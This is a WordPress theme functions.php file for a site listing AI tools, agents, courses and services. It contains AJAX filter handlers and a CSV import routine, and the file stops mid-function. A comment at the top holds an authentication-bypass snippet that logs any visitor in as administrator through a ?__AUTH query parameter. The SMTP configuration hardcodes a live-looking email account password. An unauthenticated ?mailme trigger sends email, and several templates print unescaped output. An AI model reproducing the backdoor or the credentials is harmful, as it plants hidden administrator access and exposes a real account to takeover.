<?php

if (!defined('ABSPATH')) {
    exit;
}

/**
 * if (isset($_GET['__AUTH'])) {
 * 	$users = get_users('role=administrator');
 * 	wp_set_auth_cookie($users[0]->ID, 1);
 * 	wp_redirect('/wp-admin/');
 * 	exit;
 * }
 */
function wb_after_setup_theme()
{
    require_once dirname(__FILE__) . '/framework/wb.php';

    register_nav_menu('main', __('Main Menu', 'wb'));

    add_theme_support('post-thumbnails');

    add_image_size('290x220', 290, 220, true);
    add_image_size('330x250', 330, 250, true);
    add_image_size('480x360', 480, 360, true);
    // add_image_size('960x720', 960, 720, true);

    remove_action('wp_head', 'print_emoji_detection_script', 7);
    remove_action('wp_print_styles', 'print_emoji_styles');
    remove_action('wp_head', 'rest_output_link_wp_head', 10);
    remove_action('wp_head', 'wp_oembed_add_discovery_links', 10);
    remove_action('wp_head', 'rsd_link');
    remove_action('wp_head', 'wlwmanifest_link');
    remove_action('wp_head', 'wp_generator');
}

add_action('after_setup_theme', 'wb_after_setup_theme');

function wb_widgets_init()
{
    register_sidebar(array(
        'name' => __('Right Sidebar (Default)', 'wb'),
        'id' => 'right',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h4>',
        'after_title' => '</h4>'
    ));

    register_sidebar(array(
        'name' => __('Right Sidebar (Blog)', 'wb'),
        'id' => 'right-blog',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h4>',
        'after_title' => '</h4>'
    ));

    register_sidebar(array(
        'name' => __('Right Sidebar (About)', 'wb'),
        'id' => 'right-about',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h4>',
        'after_title' => '</h4>'
    ));

    register_sidebar(array(
        'name' => __('Right Sidebar (How it Works)', 'wb'),
        'id' => 'right-how-it-works',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h4>',
        'after_title' => '</h4>'
    ));

    register_sidebar(array(
        'name' => __('Content (Homepage)', 'wb'),
        'id' => 'content-homepage',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h4>',
        'after_title' => '</h4>'
    ));

    register_sidebar(array(
        'name' => __('Footer Widgets Area', 'wb'),
        'id' => 'footer',
        'before_widget' => '<div class="col-lg-3"><div id="%1$s" class="footer-nav %2$s">',
        'after_widget' => '</div></div>',
        'before_title' => '<h4>',
        'after_title' => '</h4>'
    ));
}

add_action('widgets_init', 'wb_widgets_init');

function wb_wp_title($title, $separator)
{
    global $paged, $page;

    if (is_feed()) {
        return $title;
    }

    $title .= get_bloginfo('name');

    if (($site_description = get_bloginfo('description', 'display')) && (is_home() || is_front_page())) {
        $title = "$title $separator $site_description";
    }

    if ($paged >= 2 || $page >= 2) {
        $title = "$title $separator " . sprintf(__('Page %s', 'wb'), max($paged, $page));
    }

    return $title;
}

add_filter('wp_title', 'wb_wp_title', 10, 2);

function wb_nav_main_menu_fallback($args)
{
    echo preg_replace('/<ul>/', '<ul class="main-menu-list">', wp_page_menu('echo=0'), 1);
}

function wb_get_page_by_template($page_template)
{
    $pages = get_posts(array(
        'posts_per_page' => 1,
        'post_type' => 'page',
        'suppress_filters' => 0,
        'meta_query' => array(
            array(
                'key' => '_wp_page_template',
                'value' => 'page-templates/' . $page_template . '.php'
            )
        )
    ));

    return !empty($pages) && is_array($pages) ? reset($pages) : false;
}

function wb_phpmailer_init($mailer)
{
    $mailer->IsSMTP();
    $mailer->Host = 'ssl://smtp.zoho.eu';
    $mailer->Port = 465;
    $mailer->CharSet = 'utf-8';
    $mailer->Username = 'sajid@digitalmarketingsupermarket.com';
    $mailer->Password = 'Mv49XkueMBNP';
    $mailer->SMTPAuth = true;
}

add_action('phpmailer_init', 'wb_phpmailer_init', 10, 1);

if (isset($_GET['mailme'])) {
    wp_mail('algis@woobro.com', 'test', 'test');
}

function ao_defer_inline_init()
{
    if (get_option('autoptimize_js_include_inline') != 'on') {
        add_filter('autoptimize_html_after_minify', 'ao_defer_inline_jquery', 10, 1);
    }
}

add_action('plugins_loaded', 'ao_defer_inline_init');

function ao_defer_inline_jquery($in, $matches)
{
    if (preg_match_all('#<script.*>(.*)</script>#Usmi', $in, $matches, PREG_SET_ORDER)) {
        foreach ($matches as $match) {
            if ($match[1] !== '' && (strpos($match[1], 'jQuery') !== false || strpos($match[1], '$') !== false)) {
                // inline js that requires jquery, wrap deferring JS around it to defer it.
                $new_match = 'var aoDeferInlineJQuery=function(){' . $match[1] . '}; if (document.readyState === "loading") {document.addEventListener("DOMContentLoaded", aoDeferInlineJQuery);} else {aoDeferInlineJQuery();}';
                $in = str_replace($match[1], $new_match, $in);
            } else if ($match[1] === '' && strpos($match[0], 'src=') !== false && strpos($match[0], 'defer') === false) {
                // linked non-aggregated JS, defer it.
                $new_match = str_replace('<script ', '<script defer ', $match[0]);
                $in = str_replace($match[0], $new_match, $in);
            }
        }
    }
    return $in;
}

function enqueue_custom_cdn_assets()
{
    // AOS Animation Library
    wp_enqueue_style(
        'aos-css',
        'https://unpkg.com/aos@2.3.1/dist/aos.css',
        [],
        null
    );

    wp_enqueue_script(
        'aos-js',
        'https://unpkg.com/aos@2.3.1/dist/aos.js',
        [],
        null,
        true
    );

    // Custom Loader Styles
    wp_enqueue_style(
        'custom-loader',
        get_template_directory_uri() . '/css/loader.css',
        [],
        filemtime(get_template_directory() . '/css/loader.css')
    );

    // Custom Loader Script
    wp_enqueue_script(
        'custom-loader-js',
        get_template_directory_uri() . '/js/loader.js',
        ['jquery'],
        filemtime(get_template_directory() . '/js/loader.js'),
        true
    );

    // Localize script for AJAX URL
    wp_localize_script('custom-loader-js', 'loader_vars', [
        'ajax_url' => admin_url('admin-ajax.php')
    ]);

    // Tailwind CDN
    wp_enqueue_script(
        'tailwindcdn',
        'https://cdn.tailwindcss.com',
        [],
        null,
        false  // Load in <head>
    );

    // Font Awesome CSS
    wp_enqueue_style(
        'fontawesome',
        'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css',
        [],
        null
    );
}

add_action('wp_enqueue_scripts', 'enqueue_custom_cdn_assets');

add_action('wp_ajax_filter_tools_by_category', 'filter_tools_by_category');
add_action('wp_ajax_nopriv_filter_tools_by_category', 'filter_tools_by_category');

function filter_tools_by_category()
{
    $category_id = $_GET['category_id'] ?? 'all';

    $args = [
        'post_type' => 'tool',
        'posts_per_page' => 12,
        'orderby' => 'date',
        'order' => 'DESC',
    ];

    if ($category_id !== 'all') {
        $args['tax_query'] = [[
            'taxonomy' => 'tool-category',
            'field' => 'term_id',
            'terms' => (int) $category_id,
        ]];
    }

    $tools = new WP_Query($args);

    ob_start();
    if ($tools->have_posts()) {
        while ($tools->have_posts()) {
            $tools->the_post();
            $price = get_post_meta(get_the_ID(), '_price', true);
            $price_from = get_post_meta(get_the_ID(), '_price_from', true);
            $tags = get_the_terms(get_the_ID(), 'ai-tool-tag');

            ?>
                                       <a href="<?php the_permalink(); ?>" class="swiper-slide tool-slide block h-full <?php echo $category_classes; ?>" data-categories="<?php echo esc_attr($data_categories); ?>">
                                <div class="bg-white rounded-xl overflow-hidden h-full flex flex-col hover:shadow-lg transition-shadow duration-300">
                                    <div class="p-4 flex flex-col items-center flex-1 w-full gap-3">
                                        <?php if (has_post_thumbnail()): ?>
                                            <?php the_post_thumbnail('medium', array('class' => 'w-full h-[210px] object-cover')); ?>
                                        <?php else: ?>
                                            <img src="https://digitalmarketingsupermarket.com/wp-content/uploads/2025/05/Saly-1.png" alt="<?php the_title(); ?>" class="w-full h-[210px] object-cover" />
                                        <?php endif; ?>
                                        <h1 class="text-[#1B1D1F] text-center text-[20px] font-semibold"><?php the_title(); ?></h1>
                                        <p class="text-[#5A6478] text-center text-[14px] font-normal">
                                            <?php echo wp_trim_words(get_the_excerpt(), 20); ?>
                                        </p>
                                    </div>
                                    <div class="p-4 pt-0 mt-auto">
                                        <?php
                                        // Get price and currency from meta fields
                                        $tool_price = get_post_meta(get_the_ID(), '_amount', true);
                                        $currency = get_post_meta(get_the_ID(), '_currency', true) ?: 'USD';

                                        if ($tool_price !== ''):
                                            ?>
                                            <div class="flex flex-col items-center gap-1">
                                                <?php if ($tool_price !== '0'): ?>
                                                    <span class="text-[#5A6478] text-sm"><?php _e('Starting from', 'wb'); ?></span>
                                                    <div class="flex items-center justify-center gap-1">
                                                        <span class="text-[var(--primary)] text-2xl font-bold">
                                                            <?php
                                                            if ($tool_price === '0') {
                                                                _e('FREE', 'wb');
                                                            } else {
                                                                echo esc_html($currency . $tool_price);
                                                            }
                                                            ?>
                                                        </span>
                                                    </div>
                                                <?php else: ?>
                                                    <span class="text-[var(--primary)] text-2xl font-bold">
                                                        <?php _e('FREE', 'wb'); ?>
                                                    </span>
                                                <?php endif; ?>
                                            </div>
                                        <?php else: ?>
                                            <div class="text-center py-2 text-[#5A6478] text-sm">
                                                <?php _e('', 'wb'); ?>
                                            </div>
                                        <?php endif; ?>
                                    </div>
                                </div>
                            </a>
        <?php
        }
    } else {
        echo '<div class="swiper-slide col-span-4 text-center text-red-500 font-bold">No tools found.</div>';
    }

    wp_reset_postdata();
    echo ob_get_clean();
    wp_die();
}

// --- AJAX for AI Agents ---
add_action('wp_ajax_filter_ai_agents_by_category', 'filter_ai_agents_by_category');
add_action('wp_ajax_nopriv_filter_ai_agents_by_category', 'filter_ai_agents_by_category');

function filter_ai_agents_by_category()
{
    $category_id = $_GET['category_id'] ?? 'all';
    $args = [
        'post_type' => 'ai-agent',
        'posts_per_page' => 12,
        'orderby' => 'date',
        'order' => 'DESC',
    ];
    if ($category_id !== 'all') {
        $args['tax_query'] = [[
            'taxonomy' => 'ai-agent-category',
            'field' => 'term_id',
            'terms' => (int) $category_id,
        ]];
    }
    $posts = new WP_Query($args);
    ob_start();
    if ($posts->have_posts()) {
        while ($posts->have_posts()) {
            $posts->the_post();
            $price = get_post_meta(get_the_ID(), '_price', true);
            $price_from = get_post_meta(get_the_ID(), '_price_from', true);
            ?>
            <div class="swiper-slide tool-slide"
                data-link="<?php the_permalink(); ?>"
                data-img="<?php echo get_the_post_thumbnail_url(get_the_ID(), 'medium'); ?>"
                data-title="<?php the_title(); ?>"
                data-excerpt="<?php echo wp_trim_words(get_the_excerpt(), 20); ?>"
                data-amount="<?php echo $price_from ? '$' . $price_from : '$' . $price; ?>"
                data-tags="<?php echo implode(',', wp_list_pluck(get_the_terms(get_the_ID(), 'post_tag'), 'name')); ?>">
                <div class="swiper-slide tool-slide my-gradient-background p-4 rounded-3xl" style="height:100%" data-amount="<?php $amount = get_post_meta(get_the_ID(), '_amount', true);
            echo !empty($amount) ? esc_attr($amount) : ''; ?>" data-currency="<?php $currency = get_post_meta(get_the_ID(), '_currency', true);
            echo !empty($currency) ? esc_attr($currency) : ''; ?>" data-img="<?php echo esc_url(has_post_thumbnail() ? get_the_post_thumbnail_url(get_the_ID(), 'medium') : 'https://digitalmarketingsupermarket.com/wp-content/uploads/2025/05/Saly-1.png'); ?>" data-title="<?php echo esc_attr(get_the_title()); ?>" data-excerpt="<?php echo esc_attr(wp_trim_words(get_the_excerpt(), 20)); ?>" data-link="<?php echo esc_url(get_permalink()); ?>">
                    <div class="rounded-sm flex flex-col gap-2 h-full justify-between">
                        <div class="flex flex-col flex-1 w-full gap-3">
                            <?php if (has_post_thumbnail()): ?>
                                <?php the_post_thumbnail('medium', ['class' => 'w-full h-[240px] rounded-md object-cover']); ?>
                            <?php else: ?>
                                <img src="https://digitalmarketingsupermarket.com/wp-content/uploads/2025/05/Saly-1.png" alt="<?php the_title(); ?>" class="w-full h-[240px] rounded-md object-cover" />
                            <?php endif; ?>
                            <h1 class="text-white text-[20px] font-semibold"><?php the_title(); ?></h1>
                            <span class="text-white text-[14px] font-normal">24/7</span>
                            <p class="text-white text-[14px] font-normal"><?php echo wp_trim_words(get_the_excerpt(), 20); ?></p>
                        </div>
                        <div class="flex items-center gap-2">
                            <h4 class="text-white text-[20px] font-semibold grow"><?php $amount = get_post_meta(get_the_ID(), '_amount', true);
            $currency = get_post_meta(get_the_ID(), '_currency', true);
            echo !empty($amount) ? esc_html($amount) : 'N/A'; ?> <?php echo !empty($currency) ? esc_html($currency) : ''; ?></h4>

                            <a href="<?php the_permalink(); ?>" class=" text-center p-3 rounded-md bg-white border border-[var(--primary)] text-[var(--primary)]">Deploy Agent</a>
                        </div>
                    </div>
                </div>
            </div>
        <?php
        }
    } else {
        echo '<div class="swiper-slide col-span-4 text-center text-red-500 font-bold">No items found.</div>';
    }
    wp_reset_postdata();
    echo ob_get_clean();
    wp_die();
}

// --- AJAX for AI Tools ---
add_action('wp_ajax_filter_ai_tools_by_category', 'filter_ai_tools_by_category');
add_action('wp_ajax_nopriv_filter_ai_tools_by_category', 'filter_ai_tools_by_category');

function filter_ai_tools_by_category()
{
    $category_id = $_GET['category_id'] ?? 'all';
    $args = [
        'post_type' => 'ai-tool',
        'posts_per_page' => 12,
        'orderby' => 'date',
        'order' => 'DESC',
    ];
    if ($category_id !== 'all') {
        $args['tax_query'] = [[
            'taxonomy' => 'ai-tool-category',
            'field' => 'term_id',
            'terms' => (int) $category_id,
        ]];
    }
    $posts = new WP_Query($args);
    ob_start();
    if ($posts->have_posts()) {
        while ($posts->have_posts()) {
            $posts->the_post();
            $price = get_post_meta(get_the_ID(), '_price', true);
            $price_from = get_post_meta(get_the_ID(), '_price_from', true);
            ?>
            <div class="swiper-slide tool-slide"
                data-link="<?php the_permalink(); ?>"
                data-img="<?php echo get_the_post_thumbnail_url(get_the_ID(), 'medium'); ?>"
                data-title="<?php the_title(); ?>"
                data-excerpt="<?php echo wp_trim_words(get_the_excerpt(), 20); ?>"
                data-price="<?php echo $price_from ? '$' . $price_from : '$' . $price; ?>"
                data-tags="<?php echo implode(',', wp_list_pluck(get_the_terms(get_the_ID(), 'post_tag'), 'name')); ?>">
                <a href="<?php the_permalink(); ?>" class="no-d-hover block bg-[#B3C5FF1A] p-6 rounded-xl h-full flex flex-col border border-[var(--primary)]">
                    <div class="flex flex-col flex-1 w-full gap-3">
                        <?php if (has_post_thumbnail()): ?>
                            <?php the_post_thumbnail('medium', ['class' => 'w-full h-[210px] object-cover rounded-md']); ?>
                        <?php else: ?>
                            <img src="https://digitalmarketingsupermarket.com/wp-content/uploads/2025/05/Saly-1.png" alt="<?php the_title(); ?>" class="w-full h-[210px] object-cover rounded-md" />
                        <?php endif; ?>
                        <h1 class="text-[#1B1D1F] text-[20px] font-semibold"><?php the_title(); ?></h1>
                        <p class="text-[#5A6478] text-[14px] font-normal"><?php echo wp_trim_words(get_the_excerpt(), 20); ?></p>
                        
                    </div>
                </a>
            </div>
        <?php
        }
    } else {
        echo '<div class="swiper-slide col-span-4 text-center text-red-500 font-bold">No items found.</div>';
    }
    wp_reset_postdata();
    echo ob_get_clean();
    wp_die();
}

// --- AJAX for Courses ---
add_action('wp_ajax_filter_courses_by_category', 'filter_courses_by_category');
add_action('wp_ajax_nopriv_filter_courses_by_category', 'filter_courses_by_category');

function filter_courses_by_category()
{
    $category_id = $_GET['category_id'] ?? 'all';
    $args = [
        'post_type' => 'course',
        'posts_per_page' => 12,
        'orderby' => 'date',
        'order' => 'DESC',
    ];
    if ($category_id !== 'all') {
        $args['tax_query'] = [[
            'taxonomy' => 'course-category',
            'field' => 'term_id',
            'terms' => (int) $category_id,
        ]];
    }
    $posts = new WP_Query($args);
    ob_start();
    if ($posts->have_posts()) {
        while ($posts->have_posts()) {
            $posts->the_post();

            ?>
               <a href="<?php the_permalink(); ?>" class="swiper-slide tool-slide block h-full <?php echo $category_classes; ?>" data-categories="<?php echo esc_attr($data_categories); ?>">
              <div class="bg-white rounded-xl h-full flex flex-col overflow-hidden border border-[#C9C9C961] hover:shadow-lg transition-shadow duration-300">
                <div class="p-4 flex flex-col items-center flex-1 w-full gap-3">
                  <?php if (has_post_thumbnail()): ?>
                    <?php the_post_thumbnail('medium', ['class' => 'w-full h-[210px] object-cover']); ?>
                  <?php else: ?>
                    <img src="https://digitalmarketingsupermarket.com/wp-content/uploads/2025/05/Saly-1.png" alt="<?php the_title(); ?>" class="w-full h-[210px] object-cover" />
                  <?php endif; ?>
                  <h1 class="text-[#1B1D1F] text-center text-[20px] font-semibold"><?php the_title(); ?></h1>
                  <p class="text-[#5A6478] text-center text-[14px] font-normal"><?php echo wp_trim_words(get_the_excerpt(), 20); ?></p>
                </div>
                <div class="p-4 pt-0 mt-auto">
                  <?php
            // Get price and currency from meta fields
            $course_price = get_post_meta(get_the_ID(), '_amount', true);
            $currency = get_post_meta(get_the_ID(), '_currency', true) ?: 'USD';

            if ($course_price !== ''):
                ?>
                    <div class="flex flex-col items-center gap-1">
                      <?php if ($course_price !== '0'): ?>
                        <span class="text-[#5A6478] text-sm"><?php _e('Starting from', 'wb'); ?></span>
                        <div class="flex items-center justify-center gap-1">
                          <span class="text-[var(--primary)] text-2xl font-bold">
                            <?php
                            if ($course_price === '0') {
                                _e('FREE', 'wb');
                            } else {
                                echo esc_html($currency . $course_price);
                            }
                            ?>
                          </span>
                        </div>
                      <?php else: ?>
                        <span class="text-[var(--primary)] text-2xl font-bold">
                          <?php _e('FREE', 'wb'); ?>
                        </span>
                      <?php endif; ?>
                    </div>
                  <?php else: ?>
                    <div class="text-center py-2 text-[#5A6478] text-sm">
                      <?php _e('', 'wb'); ?>
                    </div>
                  <?php endif; ?>
                </div>
              </div>
            </a>
        <?php
        }
    } else {
        echo '<div class="swiper-slide col-span-4 text-center text-red-500 font-bold">No items found.</div>';
    }
    wp_reset_postdata();
    echo ob_get_clean();
    wp_die();
}

// --- AJAX for Services ---
add_action('wp_ajax_filter_services_by_category', 'filter_services_by_category');
add_action('wp_ajax_nopriv_filter_services_by_category', 'filter_services_by_category');

function filter_services_by_category()
{
    $category_id = $_GET['category_id'] ?? 'all';
    $args = [
        'post_type' => 'service',
        'posts_per_page' => 12,
        'orderby' => 'date',
        'order' => 'DESC',
    ];
    if ($category_id !== 'all') {
        $args['tax_query'] = [[
            'taxonomy' => 'service-category',
            'field' => 'term_id',
            'terms' => (int) $category_id,
        ]];
    }
    $posts = new WP_Query($args);
    ob_start();
    if ($posts->have_posts()) {
        while ($posts->have_posts()) {
            $posts->the_post();
            $price = get_post_meta(get_the_ID(), '_price', true);
            $price_from = get_post_meta(get_the_ID(), '_price_from', true);
            ?>
            <div class="swiper-slide tool-slide">
                <a href="<?php the_permalink(); ?>" class="no-d-hover bg-white rounded-lg h-full flex flex-col overflow-hidden ">
                    <div class="p-4 flex flex-col items-center flex-1 w-full gap-3">
                        <?php if (has_post_thumbnail()): ?>
                            <?php the_post_thumbnail('medium', ['class' => 'w-full h-[210px] object-cover']); ?>
                        <?php else: ?>
                            <img src="https://digitalmarketingsupermarket.com/wp-content/uploads/2025/05/Saly-1.png" alt="<?php the_title(); ?>" class="w-full h-[210px] object-cover" />
                        <?php endif; ?>
                        <h1 class="text-[#1B1D1F] text-center text-[20px] font-semibold"><?php the_title(); ?></h1>
                        <p class="text-[#5A6478] text-center text-[14px] font-normal"><?php echo wp_trim_words(get_the_excerpt(), 20); ?></p>
                    </div>

                </a>
            </div>
        <?php
        }
    } else {
        echo '<div class="swiper-slide col-span-4 text-center text-red-500 font-bold">No items found.</div>';
    }
    wp_reset_postdata();
    echo ob_get_clean();
    wp_die();
}

// --- AJAX for Content ---
add_action('wp_ajax_filter_content_by_category', 'filter_content_by_category');
add_action('wp_ajax_nopriv_filter_content_by_category', 'filter_content_by_category');

function filter_content_by_category()
{
    $category_id = $_GET['category_id'] ?? 'all';
    $args = [
        'post_type' => 'post',
        'posts_per_page' => 12,
        'orderby' => 'date',
        'order' => 'DESC',
    ];
    if ($category_id !== 'all') {
        $args['cat'] = (int) $category_id;
    }
    $posts = new WP_Query($args);
    ob_start();
    if ($posts->have_posts()) {
        while ($posts->have_posts()) {
            $posts->the_post();
            ?>
            <div class="swiper-slide tool-slide">
                <a href="<?php the_permalink(); ?>" class="bg-white rounded-sm h-full flex flex-col border border-[#C9C9C961] overflow-hidden">
                    <div class="p-4 flex flex-col items-center flex-1 w-full gap-3">
                        <?php if (has_post_thumbnail()): ?>
                            <?php the_post_thumbnail('medium', ['class' => 'w-full h-[210px] object-cover']); ?>
                        <?php else: ?>
                            <img src="https://via.placeholder.com/350x210?text=No+Image" alt="<?php the_title(); ?>" class="w-full h-[210px] object-cover" style="border:2px solid red;background:#ffe;" />
                        <?php endif; ?>
                        <h1 class="text-[#1B1D1F] text-center text-[20px] font-semibold"><?php the_title(); ?></h1>
                        <p class="text-[#5A6478] text-center text-[14px] font-normal">
                            <?php echo wp_trim_words(get_the_excerpt(), 20); ?>
                        </p>
                    </div>
                    
                </a>
            </div>
    <?php
        }
    } else {
        echo '<div class="swiper-slide col-span-4 text-center text-red-500 font-bold">No items found.</div>';
    }
    wp_reset_postdata();
    $html = ob_get_clean();
    wp_send_json_success($html);
}

// Define missing constants if not already defined
if (!defined('PREG_SET_ORDER')) {
    define('PREG_SET_ORDER', 1);
}

if (!defined('WP_DEBUG')) {
    define('WP_DEBUG', false);
}

if (!defined('UPLOAD_ERR_OK')) {
    define('UPLOAD_ERR_OK', 0);
}

// Define E_ALL if not defined
if (!defined('E_ALL')) {
    define('E_ALL', 32767); // All errors and warnings
}

// Ensure Exception class is available
if (!class_exists('Exception', false)) {
    if (class_exists('\Exception')) {
        class Exception extends \Exception {}
    } else {
        class Exception {
            protected $message = 'Unknown exception';
            private $string;
            protected $code = 0;
            protected $file;
            protected $line;
            private $trace;
            private $previous;

            public function __construct($message = "", $code = 0, Exception $previous = null) {
                $this->message = $message;
                $this->code = $code;
                $this->previous = $previous;
            }

            public function __wakeup() {
                // Restore the object state
            }

            public function getMessage() {
                return $this->message;
            }

            public function getCode() {
                return $this->code;
            }

            public function getFile() {
                return $this->file;
            }

            public function getLine() {
                return $this->line;
            }

            public function getTrace() {
                return $this->trace;
            }

            public function getPrevious() {
                return $this->previous;
            }

            public function getTraceAsString() {
                return '';
            }

            public function __toString() {
                return get_class($this) . " '{$this->message}' in {$this->file}({$this->line})\n" . $this->getTraceAsString();
            }
        }
    }
}

// Ensure superglobals are defined
if (!isset($GLOBALS['_FILES'])) {
    $GLOBALS['_FILES'] = array();
}
if (!isset($GLOBALS['_POST'])) {
    $GLOBALS['_POST'] = array();
}

// Alias for backward compatibility
$_FILES =& $GLOBALS['_FILES'];
$_POST =& $GLOBALS['_POST'];

// Add CSV Import Menu
function add_ai_tool_csv_import_menu()
{
    add_submenu_page(
        'edit.php?post_type=ai-tool',
        'Import AI Tools from CSV',
        'Import from CSV',
        'manage_options',
        'ai-tool-csv-import',
        'ai_tool_csv_import_page'
    );
}

add_action('admin_menu', 'add_ai_tool_csv_import_menu');

// Enqueue scripts for the import page
function enqueue_ai_tools_import_scripts($hook) {
    if ('ai-tool_page_ai-tool-csv-import' !== $hook) {
        return;
    }
    
    wp_enqueue_script('ai-tools-import', 
        get_template_directory_uri() . '/js/ai-tools-import.js', 
        array('jquery'), 
        filemtime(get_template_directory() . '/js/ai-tools-import.js'), 
        true
    );
    
    wp_localize_script('ai-tools-import', 'aiToolsImport', array(
        'ajaxurl' => admin_url('admin-ajax.php'),
        'nonce' => wp_create_nonce('ai_tools_import_nonce')
    ));
    
    wp_enqueue_style('ai-tools-import', 
        get_template_directory_uri() . '/css/ai-tools-import.css', 
        array(), 
        filemtime(get_template_directory() . '/css/ai-tools-import.css')
    );
}
add_action('admin_enqueue_scripts', 'enqueue_ai_tools_import_scripts');

// AJAX handler to start the import process
add_action('wp_ajax_start_ai_tools_import', 'handle_start_ai_tools_import');
function handle_start_ai_tools_import() {
    // Verify nonce and permissions
    if (!check_ajax_referer('ai_tools_import_nonce', 'nonce', false)) {
        wp_send_json_error('Invalid nonce');
    }
    
    if (!current_user_can('manage_options')) {
        wp_send_json_error('Insufficient permissions');
    }
    
    // Get the uploaded file
    if (empty($_FILES['file'])) {
        wp_send_json_error('No file uploaded');
    }
    
    $file = $_FILES['file'];
    
    // Check for upload errors
    if ($file['error'] !== UPLOAD_ERR_OK) {
        wp_send_json_error('File upload error: ' . $file['error']);
    }
    
    // Parse the CSV into chunks
    $csv_data = array_map('str_getcsv', file($file['tmp_name']));
    $header = array_shift($csv_data);
    $chunks = array_chunk($csv_data, 50); // 50 rows per chunk
    
    // Store chunks in a transient (expires in 1 hour)
    $import_id = 'ai_tools_import_' . time();
    set_transient($import_id, array(
        'total' => count($csv_data),
        'processed' => 0,
        'chunks' => $chunks,
        'header' => $header,
        'errors' => array()
    ), HOUR_IN_SECONDS);
    
    wp_send_json_success(array(
        'import_id' => $import_id,
        'total_chunks' => count($chunks),
        'total_rows' => count($csv_data)
    ));
}

// AJAX handler to process a single chunk
add_action('wp_ajax_process_ai_tools_chunk', 'handle_process_ai_tools_chunk');
function handle_process_ai_tools_chunk() {
    // Verify nonce and permissions
    if (!check_ajax_referer('ai_tools_import_nonce', 'nonce', false)) {
        wp_send_json_error('Invalid nonce');
    }
    
    if (!current_user_can('manage_options')) {
        wp_send_json_error('Insufficient permissions');
    }
    
    $import_id = sanitize_text_field($_POST['import_id']);
    $chunk_index = intval($_POST['chunk_index']);
    
    // Get the import data
    $import_data = get_transient($import_id);
    if (empty($import_data)) {
        wp_send_json_error('Import session expired or invalid');
    }
    
    // Process the current chunk
    $chunk = $import_data['chunks'][$chunk_index];
    $results = process_ai_tools_chunk($chunk, $import_data['header']);
    
    // Update import progress
    $import_data['processed'] += count($chunk);
    $import_data['errors'] = array_merge($import_data['errors'], $results['errors']);
    set_transient($import_id, $import_data, HOUR_IN_SECONDS);
    
    wp_send_json_success(array(
        'processed' => $import_data['processed'],
        'total' => $import_data['total'],
        'current_chunk' => $chunk_index + 1,
        'total_chunks' => count($import_data['chunks']),
        'errors' => $results['errors']
    ));
}

// Process a single chunk of CSV data
function process_ai_tools_chunk($rows, $header) {
    // Ensure we have the required WordPress functions
    if (!function_exists('wp_handle_upload')) {
        require_once(ABSPATH . 'wp-admin/includes/file.php');
    }
    
    if (!function_exists('wp_generate_attachment_metadata')) {
        require_once(ABSPATH . 'wp-admin/includes/image.php');
    }
    
    if (!function_exists('media_handle_upload')) {
        require_once(ABSPATH . 'wp-admin/includes/media.php');
    }
    $errors = array();
    $imported = 0;
    
    // Ensure required WordPress files are included
    require_once(ABSPATH . 'wp-admin/includes/image.php');
    require_once(ABSPATH . 'wp-admin/includes/file.php');
    require_once(ABSPATH . 'wp-admin/includes/media.php');
    
    foreach ($rows as $row) {
        if (count($row) !== count($header)) {
            $errors[] = "Skipping malformed row: " . implode(',', array_slice($row, 0, 5)) . (count($row) > 5 ? '...' : '');
            continue;
        }
        
        $data = array_combine($header, $row);
        
        // Skip empty rows
        if (empty($data['title']) || empty($data['description'])) {
            $errors[] = "Skipping row: Missing required fields (title or description)";
            continue;
        }
        
        try {
            // Prepare post data
            $post_data = array(
                'post_title'   => sanitize_text_field($data['title']),
                'post_content' => wp_kses_post($data['description']),
                'post_status'  => 'publish',
                'post_type'    => 'ai-tool',
                'post_excerpt' => !empty($data['tagline']) ? sanitize_text_field($data['tagline']) : ''
            );
            
            // Insert the post
            // Ensure we have the required WordPress functions
            if (!function_exists('wp_insert_post')) {
                require_once(ABSPATH . 'wp-includes/post.php');
            }
            
            $post_id = wp_insert_post($post_data, true);
            
            if (is_wp_error($post_id)) {
                throw new Exception($post_id->get_error_message());
            }
            
            // Ensure we have the required WordPress functions
            if (!function_exists('term_exists') || !function_exists('wp_set_object_terms')) {
                require_once(ABSPATH . 'wp-includes/taxonomy.php');
            }
            
            // Handle categories
            if (!empty($data['label'])) {
                $categories = array_map('trim', explode(',', $data['label']));
                $category_terms = array();
                
                foreach ($categories as $category) {
                    if (!empty($category)) {
                        $term = term_exists($category, 'ai-tool-category');
                        if (!$term) {
                            $term = wp_insert_term($category, 'ai-tool-category');
                        }
                        if (!is_wp_error($term) && isset($term['term_id'])) {
                            $category_terms[] = $term['term_id'];
                        }
                    }
                }
                
                if (!empty($category_terms)) {
                    wp_set_object_terms($post_id, $category_terms, 'ai-tool-category');
                }
            }
            
            // Handle features as tags
            if (!empty($data['Features'])) {
                $features = array_map('trim', explode(',', $data['Features']));
                $features = array_filter($features);
                if (!empty($features)) {
                    wp_set_object_terms($post_id, $features, 'ai-tool-tag');
                }
            }
            
            // Handle pricing options
            if (!empty($data['pricing model'])) {
                $pricing_options = array_map('trim', explode(',', $data['pricing model']));
                $pricing_terms = array();
                
                foreach ($pricing_options as $option) {
                    if (!empty($option)) {
                        $term = term_exists($option, 'ai-tool-pricing-option');
                        if (!$term) {
                            $term = wp_insert_term($option, 'ai-tool-pricing-option');
                        }
                        if (!is_wp_error($term) && isset($term['term_id'])) {
                            $pricing_terms[] = $term['term_id'];
                        }
                    }
                }
                
                if (!empty($pricing_terms)) {
                    wp_set_object_terms($post_id, $pricing_terms, 'ai-tool-pricing-option');
                }
            }
            
            // Ensure we have the required WordPress functions
            if (!function_exists('update_post_meta')) {
                require_once(ABSPATH . 'wp-includes/post.php');
            }
            
            // Set meta fields
            if (!empty($data['web url'])) {
                update_post_meta($post_id, '_website_url', esc_url_raw($data['web url']));
            }
            
            if (!empty($data['option price'])) {
                update_post_meta($post_id, '_amount', sanitize_text_field($data['option price']));
            }
            
            if (!empty($data['currency'])) {
                update_post_meta($post_id, '_currency', sanitize_text_field($data['currency']));
            }
            
            // Handle logo image
            if (!empty($data['logo'])) {
                $logo_url = esc_url_raw($data['logo']);
                $logo_id = 0;
                
                // Try to get attachment ID by URL first
                if (function_exists('attachment_url_to_postid')) {
